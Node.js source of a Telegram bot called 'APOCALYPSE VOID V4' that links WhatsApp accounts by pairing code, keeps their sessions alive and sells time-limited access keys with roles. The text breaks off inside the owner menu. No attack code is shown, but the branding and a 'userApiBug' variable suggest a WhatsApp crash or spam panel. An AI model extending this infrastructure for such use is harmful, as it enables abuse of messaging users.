// file: index.js
const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { spawn } = require('child_process');
const cors = require("cors");

// ==================== IMPORT MODULE BARU ==================== //
const { getUsers, saveUsers, loadAkses, saveAkses, isOwner, isAuthorized } = require('./user-manager.js');
const { 
    activeSessions, 
    savePersistentSessions, 
    cleanupExpiredSessions,
    generateSessionId 
} = require('./session-store.js');
const toolsRouter = require('./tools.js');

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

// ✅ Allow semua origin
app.use(cors());

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const userSessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const { getCountryCode, validatePhoneNumber } = require("./helpers/phone-helper.js");
const userEvents = new Map();
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// ==================== LOAD USER SESSIONS FUNCTION ==================== //
function loadUserSessions() {
    try {        
        if (!fs.existsSync(userSessionsPath)) {
            const initialData = {};
            fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
            return initialData;
        }
        
        // Baca file
        const fileContent = fs.readFileSync(userSessionsPath, "utf8").trim();
        
        if (!fileContent) {
            return {};
        }
        
        // Parse JSON dengan error handling
        let data;
        try {
            data = JSON.parse(fileContent);
        } catch (parseError) {
            console.error('[SESSION] JSON parse error:', parseError.message);
            
            // Backup file yang corrupt
            const backupPath = userSessionsPath + '.backup-' + Date.now();
            fs.copyFileSync(userSessionsPath, backupPath);
            
            // Reset ke empty object
            data = {};
            fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
        }
        
        // Validasi struktur data
        if (typeof data !== 'object' || data === null) {
            data = {};
            fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
        }
        
        // Hapus entri yang tidak valid
        let cleanedCount = 0;
        Object.keys(data).forEach(username => {
            if (!Array.isArray(data[username])) {
                delete data[username];
                cleanedCount++;
            } else {
                // Hapus nomor yang bukan string
                const originalLength = data[username].length;
                data[username] = data[username].filter(num => 
                    typeof num === 'string' && num.length >= 7 && num.length <= 15 && /^\d+$/.test(num)
                );
                cleanedCount += (originalLength - data[username].length);
                
                // Hapus duplikat
                const uniqueNumbers = [...new Set(data[username])];
                cleanedCount += (data[username].length - uniqueNumbers.length);
                data[username] = uniqueNumbers;
            }
        });
        
        // Hapus user dengan array kosong
        Object.keys(data).forEach(username => {
            if (data[username].length === 0) {
                delete data[username];
                cleanedCount++;
            }
        });
        
        // Hitung total sessions
        const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
        
        if (cleanedCount > 0) {
            saveUserSessions(data);
        }
        
        return data;
    } catch (err) {
        console.error("[SESSION] ❌ Error loading user_sessions.json:", err);
        return {};
    }
}

// ==================== SAVE USER SESSIONS FUNCTION ==================== //
function saveUserSessions(data) {
    try {
        // Pastikan data adalah object valid
        if (typeof data !== 'object' || data === null) {
            console.error('[SESSION] Invalid data for saving, resetting...');
            data = {};
        }
        
        // Filter out empty arrays dan invalid data
        Object.keys(data).forEach(username => {
            if (!Array.isArray(data[username]) || data[username].length === 0) {
                delete data[username];
            } else {
                // Validasi setiap nomor
                data[username] = data[username].filter(num => 
                    typeof num === 'string' && num.length >= 7 && num.length <= 15 && /^\d+$/.test(num)
                );
                
                // Hapus duplikat
                data[username] = [...new Set(data[username])];
            }
        });
        
        // Hitung total
        const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
        
        // Tulis ke file
        fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
        
        return true;
    } catch (err) {
        console.error("❌ Gagal menyimpan user_sessions.json:", err);
        return false;
    }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function sendEventToUser(username, eventData) {
    const res = userEvents.get(username);
    if (res) {
        try {
            res.write(`data: ${JSON.stringify(eventData)}\n\n`);
        } catch (err) {
            console.error(`[EVENT] Error sending event to ${username}:`, err.message);
            userEvents.delete(username);
        }
    }
}

// ==================== ENHANCED HEALTH CHECK ==================== //
let isReloading = false;

function enhancedHealthCheck() {
    if (isReloading) return;
    
    const activeSessionCount = sessions.size;
    const userSessions = loadUserSessions();
    const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
    
    console.log(chalk.bold(`\n📊  [HEALTH CHECK] Active: ${activeSessionCount}/${totalRegisteredSessions} sessions`));
    
    // Jika ada perbedaan antara yang terdaftar dan yang aktif
    if (totalRegisteredSessions > 0 && activeSessionCount < totalRegisteredSessions) {
        const missingCount = totalRegisteredSessions - activeSessionCount;
        console.log(chalk.yellow(`   ⚠️ Missing ${missingCount} sessions, attempting to reload...`));
        
        isReloading = true;
        simpleReloadSessions();
        
        // Reset flag setelah 30 detik
        setTimeout(() => {
            isReloading = false;
            console.log(chalk.green.bold('🔄 [HEALTH CHECK] Reload cycle completed'));
        }, 30000);
    } else if (activeSessionCount > 0) {
        console.log(chalk.green('   ✅ All sessions are active'));
    }
}

// Jalankan health check setiap 2 menit
setInterval(enhancedHealthCheck, 2 * 60 * 1000);

// Jalankan health check pertama setelah 30 detik
setTimeout(enhancedHealthCheck, 30000);

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

async function forceReloadWithRetry() {
    reloadAttempts++;
    console.log(chalk.yellow.bold(`\n[STARTUP] 🔄 Reload attempt ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`));
    
    const userSessions = loadUserSessions();
    
    if (Object.keys(userSessions).length === 0) {
        console.log(chalk.yellow('[STARTUP] 💡 No sessions to reload - waiting for users to add senders'));
        return;
    }
    
    // Panggil reload function
    await simpleReloadSessions();
    
    // Beri waktu untuk semua koneksi
    setTimeout(() => {
        const activeSessionCount = sessions.size;
        console.log(chalk.blue(`\n[STARTUP] 📊 Current active sessions: ${activeSessionCount}`));
        
        if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
            console.log(chalk.yellow.bold(`[STARTUP] 🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`));
            
            // Tunggu 10 detik sebelum retry
            setTimeout(() => {
                forceReloadWithRetry();
            }, 10000);
        } else if (activeSessionCount === 0) {
            console.log(chalk.red('[STARTUP] ❌ All reload attempts failed - manual reconnection required'));
        } else {
            console.log(chalk.green.bold(`[STARTUP] ✅ SUCCESS: ${activeSessionCount} sessions active`));
        }
    }, 30000);
}

async function simpleReloadSessions() {
    const userSessions = loadUserSessions();
    
    if (Object.keys(userSessions).length === 0) {
        console.log(chalk.yellow.bold('[RELOAD] 💡 No user sessions found'));
        return;
    }

    let totalProcessed = 0;
    let successCount = 0;
    let failedCount = 0;

    // Loop melalui semua user
    for (const [username, numbers] of Object.entries(userSessions)) {
        
        // Loop melalui setiap nomor
        for (const number of numbers) {
            totalProcessed++;
            
            // Skip jika sudah aktif
            if (sessions.has(number)) {
                continue;
            }
            
            const sessionDir = userSessionPath(username, number);
            const credsPath = path.join(sessionDir, 'creds.json');
            
            // Cek apakah session files ada
            if (fs.existsSync(credsPath)) {
                console.log(chalk.cyan.bold(`[RELOAD] 🔗 Connecting ${number}...`));
                
                try {
                    // Gunakan promise dengan timeout
                    const sock = await Promise.race([
                        connectToWhatsAppUser(username, number, sessionDir),
                        new Promise((_, reject) => 
                            setTimeout(() => reject(new Error('Connection timeout')), 60000)
                        )
                    ]);
                    
                    if (sock) {
                        successCount++;
                        // Session sudah disimpan di connectToWhatsAppUser
                        console.log(chalk.green.bold(`[RELOAD] ✅ ${number} connected successfully`));
                    }
                } catch (error) {
                    failedCount++;
                    console.log(chalk.red.bold(`[RELOAD] ❌ ${number} failed: ${error.message}`));
                }
                
                // Delay antar koneksi untuk menghindari rate limit
                await new Promise(resolve => setTimeout(resolve, 2000));
            } else {
                console.log(chalk.yellow.bold(`[RELOAD] ⏭️ ${number} - No session files, skipping`));
                failedCount++;
            }
        }
    }
}

// Panggil auto-reload saat startup
setTimeout(() => {
    console.log(chalk.blue.bold('\n' + '='.repeat(50)));
    console.log(chalk.cyan.bold('🚀  STARTING AUTO-RELOAD OF WHATSAPP SESSIONS'));
    console.log(chalk.blue.bold('='.repeat(50)));
    forceReloadWithRetry();
}, 5000);

// ==================== AUTO RELOAD ON STARTUP ==================== //
// Fungsi untuk memuat ulang semua session saat server dimulai
async function reloadAllSessionsOnStartup() {
    console.log(chalk.cyan.bold('\n🔧 [STARTUP] Starting auto-reload of all sessions...'));
    
    const userSessions = loadUserSessions();
    const totalSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
    
    if (totalSessions === 0) {
        return;
    }
    
    let successCount = 0;
    let failedCount = 0;
    
    for (const [username, numbers] of Object.entries(userSessions)) {
        
        for (const number of numbers) {
            try {
                const sessionDir = userSessionPath(username, number);
                const credsPath = path.join(sessionDir, 'creds.json');
                
                if (fs.existsSync(credsPath)) {
                    
                    // Gunakan timeout untuk mencegah blocking
                    setTimeout(async () => {
                        try {
                            const sock = await connectToWhatsAppUser(username, number, sessionDir);
                            if (sock) {
                                successCount++;
                                console.log(chalk.green(`   ✅ Success: ${number}`));
                                
                                // Simpan ke sessions Map global
                                sessions.set(number, sock);
                            }
                        } catch (error) {
                            failedCount++;
                            console.log(chalk.yellow(`   ⚠️ Warning: ${number} - ${error.message}`));
                        }
                    }, Math.random() * 5000); // Random delay untuk menghindari rate limit
                } else {
                    console.log(chalk.gray(`   ⏭️ Skipping ${number} - No creds.json found`));
                    failedCount++;
                }
            } catch (error) {
                console.error(`   ❌ Error reloading ${number}:`, error.message);
                failedCount++;
            }
        }
    }
    
    // Beri waktu untuk semua koneksi selesai
    setTimeout(() => {
        console.log(chalk.bold(`\n📊 [STARTUP] RELOAD SUMMARY:`));
        console.log(chalk.green(`   ✅ Successfully reloaded: ${successCount}`));
        console.log(chalk.yellow(`   ⚠️ Failed to reload: ${failedCount}`));
        console.log(chalk.blue(`   🔗 Total active sessions: ${sessions.size}`));
    }, 15000); // Tunggu 15 detik untuk semua koneksi
}

// Panggil fungsi reload saat startup
setTimeout(() => {
    reloadAllSessionsOnStartup();
}, 8000); // Delay 8 detik setelah server startup

// ==================== CONNECT WHATSAPP USER FUNCTION ==================== //
const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
    try {
        
        // Kirim event status awal ke web interface
        sendEventToUser(username, {
            type: 'status',
            message: 'Memulai koneksi WhatsApp...',
            number: BotNumber,
            status: 'connecting'
        });

        // Gunakan auth state dari file
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestWaWebVersion();

        // Buat socket connection
        const userSock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            version: version,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000,
            generateHighQualityLinkPreview: true,
            syncFullHistory: false,
            retryRequestDelayMs: 2000,
            fireInitQueries: true,
            markOnlineOnConnect: false
        });

        return new Promise((resolve, reject) => {
            let isConnected = false;
            let pairingCodeGenerated = false;
            let connectionTimeout;
            let reconnectAttempts = 0;
            const MAX_RECONNECT_ATTEMPTS = 3;

            // Cleanup function
            const cleanup = () => {
                if (connectionTimeout) clearTimeout(connectionTimeout);
            };

            // Event handler untuk connection update
            userSock.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, qr } = update;
                
                console.log(chalk.blue.bold(`🔄 Connection update:`, connection));

                // Jika koneksi tertutup
                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    
                    console.log(chalk.red.bold(` 📴 Connection closed, status: ${statusCode}`));
                    
                    // Hapus dari sessions map
                    sessions.delete(BotNumber);
                    
                    // Hapus dari user_sessions.json jika logged out
                    if (statusCode === DisconnectReason.loggedOut) {
                        console.log(`[${username}] 📵 Device logged out, cleaning session...`);
                        
                        sendEventToUser(username, {
                            type: 'error',
                            message: 'Device logged out, silakan scan ulang',
                            number: BotNumber,
                            status: 'logged_out'
                        });
                        
                        // Hapus folder session
                        if (fs.existsSync(sessionDir)) {
                            try {
                                fs.rmSync(sessionDir, { recursive: true, force: true });
                            } catch (err) {
                                console.error(`[${username}] ❌ Failed to delete session folder:`, err.message);
                            }
                        }
                        
                        // Hapus dari user_sessions.json
                        const userSessions = loadUserSessions();
                        if (userSessions[username]) {
                            userSessions[username] = userSessions[username].filter(n => n !== BotNumber);
                            saveUserSessions(userSessions);
                        }
                        
                        cleanup();
                        reject(new Error("Device logged out, please pairing again"));
                        return;
                    }

                    // Coba reconnect untuk error tertentu
                    if (statusCode === DisconnectReason.restartRequired || 
                        statusCode === DisconnectReason.timedOut ||
                        statusCode === DisconnectReason.connectionLost) {
                        
                        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                            reconnectAttempts++;
                            
                            sendEventToUser(username, {
                                type: 'status',
                                message: `Mencoba menyambung kembali... (${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`,
                                number: BotNumber,
                                status: 'reconnecting'
                            });
                            
                            console.log(chalk.green.bold(`🔄 Reconnect attempt ${reconnectAttempts} for ${BotNumber}`));
                            
                            setTimeout(async () => {
                                try {
                                    const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                                    resolve(newSock);
                                } catch (error) {
                                    reject(error);
                                }
                            }, 5000);
                            return;
                        } else {
                            sendEventToUser(username, {
                                type: 'error',
                                message: 'Gagal reconnect setelah beberapa percobaan',
                                number: BotNumber,
                                status: 'failed'
                            });
                        }
                    }

                    // Jika tidak connected dan terjadi error
                    if (!isConnected) {
                        cleanup();
                        sendEventToUser(username, {
                            type: 'error',
                            message: `Koneksi gagal dengan status: ${statusCode}`,
                            number: BotNumber,
                            status: 'failed'
                        });
                        reject(new Error(`Connection failed with status: ${statusCode}`));
                    }
                }

                // Jika koneksi terbuka
                if (connection === "open") {
                    console.log(chalk.green.bold(`✅ CONNECTED SUCCESSFULLY!`));
                    isConnected = true;
                    cleanup();
                    
                    // SIMPANKAN KE GLOBAL SESSIONS MAP
                    sessions.set(BotNumber, userSock);
                    
                    // Update user_sessions.json
                    const userSessions = loadUserSessions();
                    if (!userSessions[username]) {
                        userSessions[username] = [];
                    }
                    if (!userSessions[username].includes(BotNumber)) {
                        userSessions[username].push(BotNumber);
                        saveUserSessions(userSessions);
                    }
                    
                    // Kirim event success
                    sendEventToUser(username, {
                        type: 'success',
                        message: 'Berhasil terhubung dengan WhatsApp!',
                        number: BotNumber,
                        status: 'connected'
                    });
                    
                    resolve(userSock);
                }

                // Jika sedang connecting
                if (connection === "connecting") {
                    sendEventToUser(username, {
                        type: 'status',
                        message: 'Menghubungkan ke WhatsApp...',
                        number: BotNumber,
                        status: 'connecting'
                    });
                    
                    // Cek jika tidak ada creds.json dan belum generate pairing code
                    if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
                        pairingCodeGenerated = true;
                        
                        setTimeout(async () => {
                            try {
                                console.log(chalk.green(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`));
                                sendEventToUser(username, {
                                    type: 'status',
                                    message: 'Meminta kode pairing...',
                                    number: BotNumber,
                                    status: 'requesting_code'
                                });
                                
                                const code = await userSock.requestPairingCode(BotNumber);
                                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                                
                                // Kirim kode pairing ke web interface
                                sendEventToUser(username, {
                                    type: 'pairing_code',
                                    message: 'Kode Pairing Berhasil Digenerate!',
                                    number: BotNumber,
                                    code: formattedCode,
                                    status: 'waiting_pairing',
                                    instructions: [
                                        '1. Buka WhatsApp di HP Anda',
                                        '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                                        '3. Masukkan kode pairing berikut:',
                                        `KODE: ${formattedCode}`,
                                        '4. Kode berlaku 30 detik!'
                                    ]
                                });
                                
                                // Simpan ke user_sessions.json
                                const userSessions = loadUserSessions();
                                if (!userSessions[username]) {
                                    userSessions[username] = [];
                                }
                                if (!userSessions[username].includes(BotNumber)) {
                                    userSessions[username].push(BotNumber);
                                    saveUserSessions(userSessions);
                                }
                                
                            } catch (err) {
                                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                                sendEventToUser(username, {
                                    type: 'error',
                                    message: `Gagal meminta kode pairing: ${err.message}`,
                                    number: BotNumber,
                                    status: 'code_error'
                                });
                            }
                        }, 3000);
                    }
                }

                // Tampilkan QR code jika ada
                if (qr) {
                    sendEventToUser(username, {
                        type: 'qr',
                        message: 'Scan QR Code berikut:',
                        number: BotNumber,
                        qr: qr,
                        status: 'waiting_qr'
                    });
                    
                    // Simpan ke user_sessions.json saat QR muncul
                    const userSessions = loadUserSessions();
                    if (!userSessions[username]) {
                        userSessions[username] = [];
                    }
                    if (!userSessions[username].includes(BotNumber)) {
                        userSessions[username].push(BotNumber);
                        saveUserSessions(userSessions);
                    }
                }
            });

            // Event handler untuk creds update
            userSock.ev.on("creds.update", saveCreds);
            
            // Event handler untuk connection close
            userSock.ev.on("connection.close", () => {
                console.log(chalk.green(`[${username}] 🔌 Connection closed event for ${BotNumber}`));
                sessions.delete(BotNumber);
            });
            
            // Timeout after 180 seconds
            connectionTimeout = setTimeout(() => {
                if (!isConnected) {
                    console.log(chalk.red(`[${username}] ⏱️ Connection timeout for ${BotNumber}`));
                    
                    sendEventToUser(username, {
                        type: 'error', 
                        message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 180 detik',
                        number: BotNumber,
                        status: 'timeout'
                    });
                    
                    // Hapus dari sessions map
                    sessions.delete(BotNumber);
                    
                    cleanup();
                    reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
                }
            }, 180000); // 3 minutes timeout
        });
    } catch (error) {
        console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
        
        // Hapus dari sessions map jika ada error
        sessions.delete(BotNumber);
        
        sendEventToUser(username, {
            type: 'error',
            message: `Error: ${error.message}`,
            number: BotNumber,
            status: 'error'
        });
        
        throw error;
    }
};

// ==================== BOT COMMANDS ==================== //
const activePolls = new Map();
const pendingCkey = new Map();

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  const ambilFoto = 'https://files.catbox.moe/j5k0yy.jpg';

  // Hapus pesan command /start
  try {
    await ctx.deleteMessage();
  } catch (e) {
    // Ignore jika tidak bisa dihapus
  }

  // Kirim foto pertama
  await ctx.replyWithPhoto(ambilFoto, {
    caption: `<blockquote><b>APOCALYPSE VOID V4</b></blockquote>\nWelcome, @${username}\n\n<blockquote><a href="https://t.me/Restzy">𝟒 ☊ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧</a></blockquote>`,
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [
        Markup.button.url('ϟ', 'https://t.me/Restzy'),
        Markup.button.url('🍷', 'https://whatsapp.com/channel/0029VbBkIex9Bb62jjiC5d1o'),
      ]
    ])
  });

  // Kirim polling
  const poll = await ctx.replyWithPoll(
    '🌜 Pilih Menu yang Diinginkan',
    ['🔑 sᴇᴛᴛɪɴɢs ᴍᴇɴᴜ', '🔧 ᴏᴡɴᴇʀ ᴍᴇɴᴜ', '📊 sᴇssɪᴏɴ sᴛᴀᴛᴜs', '❌ ᴄᴀɴᴄᴇʟ'],
    {
      is_anonymous: false,
      type: 'regular',
      allows_multiple_answers: false,
      open_period: 60,
    }
  );

  // Kirim pesan info
  const infoMsg = await ctx.reply(
    `⏳ <b>Silakan pilih menu di polling di atas!</b>\n` +
    `<i>Polling akan otomatis dihapus setelah dipilih</i>`,
    { parse_mode: "HTML" }
  );

  // Simpan data polling
  activePolls.set(poll.poll.id, {
    adminId: ctx.from.id,
    adminChatId: ctx.chat.id,
    pollMessageId: poll.message_id,
    infoMessageId: infoMsg.message_id,
    type: 'start_menu',
    timestamp: Date.now()
  });

  // Auto cleanup setelah 60 detik
  setTimeout(async () => {
    const pollData = activePolls.get(poll.poll.id);
    if (pollData) {
      try {
        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.pollMessageId);
        await ctx.telegram.deleteMessage(pollData.adminChatId, pollData.infoMessageId);
      } catch (e) {}
      activePolls.delete(poll.poll.id);
    }
  }, 60000);
});

// ================ COMMAND CKEY ================ \\
bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  const args = ctx.message.text.split(" ")[1];
  
  if (!args || !args.includes(",")) {
    return ctx.reply(
      "✗ Format: /ckey <username>,<durasi>,<telegram_id>\n\n" +
      "Contoh:\n" +
      "• /ckey user1,30d,123456789\n" +
      "• /ckey user2,7d,987654321\n\n" +
      "Durasi: 7d, 30d, 365d\n" +
      "Note: Role akan dipilih via polling"
    );
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const telegramId = parts[2] ? parts[2].trim() : '';

  if (!telegramId || !/^\d+$/.test(telegramId)) {
    return ctx.reply("✗ Telegram ID harus berupa angka!");
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) {
    return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 30d / 365d");
  }

  // Buat key terlebih dahulu
  const key = generateKey(6);
  const expired = Date.now() + durationMs;

  // Hapus pesan command
  try {
    await ctx.deleteMessage();
  } catch (e) {
    // Ignore
  }

  // Kirim polling untuk memilih role
  const poll = await ctx.replyWithPoll(
    `🔑 Pilih Role untuk ${username}`,
    ['👑 Owner', '🔧 Admin', '👤 User', '❌ Cancel'],
    {
      is_anonymous: false,
      type: 'regular',
      allows_multiple_answers: false,
      open_period: 60,
    }
  );

  // Kirim pesan info
  const infoMsg = await ctx.reply(
    `⏳ <b>Silakan pilih role di polling di atas!</b>\n` +
    `<i>Polling akan otomatis dihapus setelah dipilih</i>`,
    { parse_mode: "HTML" }
  );

  // Simpan data sementara
  pendingCkey.set(poll.poll.id, {
    adminId: userId,
    adminChatId: ctx.chat.id,
    pollMessageId: poll.message_id,
    infoMessageId: infoMsg.message_id,
    username: username,
    key: key,
    expired: expired,
    telegramId: telegramId,
    durationStr: durasiStr,
    type: 'ckey',
    timestamp: Date.now()
  });

  // Auto cleanup setelah 5 menit
  setTimeout(async () => {
    const pendingData = pendingCkey.get(poll.poll.id);
    if (pendingData) {
      try {
        await ctx.telegram.deleteMessage(pendingData.adminChatId, pendingData.pollMessageId);
        await ctx.telegram.deleteMessage(pendingData.adminChatId, pendingData.infoMessageId);
      } catch (e) {}
      
      // Kirim notifikasi expired
      try {
        await ctx.telegram.sendMessage(
          pendingData.adminId,
          `⏰ <b>Polling expired!</b>\n` +
          `Pembuatan key untuk ${pendingData.username} dibatalkan.\n` +
          `Silakan ulangi dengan /ckey`,
          { parse_mode: "HTML" }
        );
      } catch (e) {}
      
      pendingCkey.delete(poll.poll.id);
    }
  }, 5 * 60 * 1000);
});

// ==================== COMMAND LISTKEY ==================== //
bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Hanya owner yang bisa mengakses command ini.");
  }

  if (users.length === 0) {
    return ctx.reply("💢 Belum ada key yang dibuat.");
  }

  // Hapus pesan command
  try {
    await ctx.deleteMessage();
  } catch (e) {}

  // Kirim polling untuk memilih user mana yang ingin dilihat detailnya
  const userOptions = users.slice(0, 10).map((u, i) => 
    `${i + 1}. ${u.username} (${u.role || 'user'})`
  );
  
  // Tambahkan opsi untuk melihat semua
  userOptions.push('📋 Lihat Semua');
  userOptions.push('❌ Batal');

  const poll = await ctx.replyWithPoll(
    '👥 Pilih User untuk Detail',
    userOptions,
    {
      is_anonymous: false,
      type: 'regular',
      allows_multiple_answers: false,
      open_period: 60,
    }
  );

  // Kirim pesan info
  const infoMsg = await ctx.reply(
    `⏳ <b>Silakan pilih user di polling di atas!</b>\n` +
    `<i>Polling akan otomatis dihapus setelah dipilih</i>`,
    { parse_mode: "HTML" }
  );

  // Simpan data untuk polling
  pendingCkey.set(poll.poll.id, {
    adminId: userId,
    adminChatId: ctx.chat.id,
    pollMessageId: poll.message_id,
    infoMessageId: infoMsg.message_id,
    type: 'listkey',
    users: users,
    timestamp: Date.now()
  });

  // Auto cleanup
  setTimeout(async () => {
    const data = pendingCkey.get(poll.poll.id);
    if (data && data.type === 'listkey') {
      try {
        await ctx.telegram.deleteMessage(data.adminChatId, data.pollMessageId);
        await ctx.telegram.deleteMessage(data.adminChatId, data.infoMessageId);
      } catch (e) {}
      pendingCkey.delete(poll.poll.id);
    }
  }, 5 * 60 * 1000);
});

// ==================== COMMAND DELKEY ==================== //
bot.command("delkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner/Admin.");
  }
  
  const args = ctx.message.text.split(" ")[1];
  
  if (!args) {
    const users = getUsers();
    
    if (users.length === 0) {
      return ctx.reply("💢 Tidak ada user yang bisa dihapus.");
    }
    
    // Hapus pesan command
    try {
      await ctx.deleteMessage();
    } catch (e) {}
    
    // Kirim polling untuk memilih user yang ingin dihapus
    const userOptions = users.slice(0, 10).map((u, i) => 
      `${i + 1}. ${u.username} (${u.role || 'user'})`
    );
    
    userOptions.push('❌ Batal');

    const poll = await ctx.replyWithPoll(
      '🗑️ Pilih User untuk Dihapus',
      userOptions,
      {
        is_anonymous: false,
        type: 'regular',
        allows_multiple_answers: false,
        open_period: 60,
      }
    );

    // Kirim pesan info
    const infoMsg = await ctx.reply(
      `⏳ <b>Silakan pilih user di polling di atas!</b>\n` +
      `<i>Polling akan otomatis dihapus setelah dipilih</i>`,
      { parse_mode: "HTML" }
    );

    pendingCkey.set(poll.poll.id, {
      adminId: userId,
      adminChatId: ctx.chat.id,
      pollMessageId: poll.message_id,
      infoMessageId: infoMsg.message_id,
      type: 'delkey',
      users: users,
      timestamp: Date.now()
    });

    // Auto cleanup
    setTimeout(async () => {
      const data = pendingCkey.get(poll.poll.id);
      if (data && data.type === 'delkey') {
        try {
          await ctx.telegram.deleteMessage(data.adminChatId, data.pollMessageId);
          await ctx.telegram.deleteMessage(data.adminChatId, data.infoMessageId);
        } catch (e) {}
        pendingCkey.delete(poll.poll.id);
      }
    }, 5 * 60 * 1000);
    
  } else {
    // Langsung hapus dengan username
    const username = args;
    const users = getUsers();
    const index = users.findIndex(u => u.username === username);
    
    if (index === -1) {
      return ctx.reply(`✗ User \`${username}\` tidak ditemukan.`, { parse_mode: "HTML" });
    }

    users.splice(index, 1);
    saveUsers(users);
    
    ctx.reply(
      `✅ <b>User berhasil dihapus</b>\n\n` +
      `<b>Username:</b> <code>${username}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

// ==================== HANDLER POLL ANSWER UNTUK SEMUA POLLING ==================== //
bot.on('poll_answer', async (ctx) => {
  try {
    const pollAnswer = ctx.pollAnswer;
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const optionIds = pollAnswer.option_ids;
    
    if (!optionIds || optionIds.length === 0) return;
    
    const selectedOption = optionIds[0];
    
    // ==================== POLLING START MENU ==================== //
    const startPollData = activePolls.get(pollId);
    
    if (startPollData) {
      // Hapus polling message dan info message
      try {
        await ctx.telegram.deleteMessage(startPollData.adminChatId, startPollData.pollMessageId);
        await ctx.telegram.deleteMessage(startPollData.adminChatId, startPollData.infoMessageId);
      } catch (e) {
        console.log('Gagal hapus polling start:', e.message);
      }
      
      // Kirim pesan berdasarkan pilihan
      let responseMessage = '';
      
      if (selectedOption === 0) {
        // Settings Menu
        responseMessage = 
          `<blockquote>⚙️ SETTINGS MENU</blockquote>\n\n` +
          `<b>Command untuk pengaturan user:</b>\n\n` +
          `<code>/ckey username,durasi,telegram_id</code>\n` +
          `<code>/listkey</code>\n` +
          `<code>/delkey username</code>\n` +
          `<code>/myrole</code>\n\n` +
          `<i>Example: /ckey user1,30d,123456789</i>`;
          
      } else if (selectedOption === 1) {
        // Owner Menu - cek dulu apakah user owner
        const isUserOwner = isOwner(userId.toString());
        
        if (!isUserOwner) {
          responseMessage = '⚠️ <b>ACCESS DENIED</b>\nHanya owner yang bisa mengakses menu ini!';
        } else {
          responseMessage = 
            `<blockquote>👑 OWNER MENU</blockquote>\n\n` +
            `<b>Command khusus untuk owner:</b>\n\n` +
            `<code>/connect</code> - Hubungkan WhatsApp\n` +
            `<code>/listsender</code> - List semua sender\n` +
            `<code>/delsender</code> - Hapus sender\n` +
            `<code>/addowner user_id</code> - Tambah owner\n` +
            `<code>/delowner user_id</code> - Hapus owner\n\n` +
